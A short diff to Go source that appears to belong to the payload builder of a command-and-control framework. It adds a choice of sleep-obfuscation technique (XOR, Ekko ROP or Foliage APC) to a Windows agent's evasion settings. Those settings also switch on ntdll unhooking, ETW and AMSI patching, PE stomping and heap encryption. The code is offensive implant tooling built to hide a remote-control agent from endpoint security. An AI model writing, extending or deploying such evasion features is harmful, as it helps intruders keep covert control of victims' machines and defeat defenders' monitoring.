@@ -54,6 +54,7 @@ const (
 // EvasionOpts holds compile-time evasion toggles (Windows).
 type EvasionOpts struct {
 	SleepObfuscation bool
+	SleepMethod      int    // 0=plain-XOR, 1=Ekko-ROP, 2=Foliage-APC
 	UnhookNtdll      bool
 	ETWPatch         bool
 	AMSIPatch        bool
@@ -147,6 +148,7 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 	default: // Windows
 		ev := EvasionOpts{
 			SleepObfuscation: true,
+			SleepMethod:      1, // Ekko by default
 			UnhookNtdll:      true,
 			ETWPatch:         true,
 			AMSIPatch:        true,
@@ -179,6 +181,7 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 			fmt.Sprintf("SYSCALL_METHOD=%d", syscallMethodInt),
 			"ENABLE_NT_PROCESS="+boolToFlag(ev.NtProcess),
 			"ENABLE_HEAP_ENCRYPT="+boolToFlag(ev.HeapEncrypt),
+			fmt.Sprintf("SLEEP_METHOD=%d", ev.SleepMethod),
 			"ENABLE_PE_STOMP="+boolToFlag(ev.PeStomp),
 			fmt.Sprintf("PE_STOMP_MODE=%d", ev.PeStompMode),
 			"PE_STOMP_RANDOMISE="+boolToFlag(ev.PeStompRandomise),
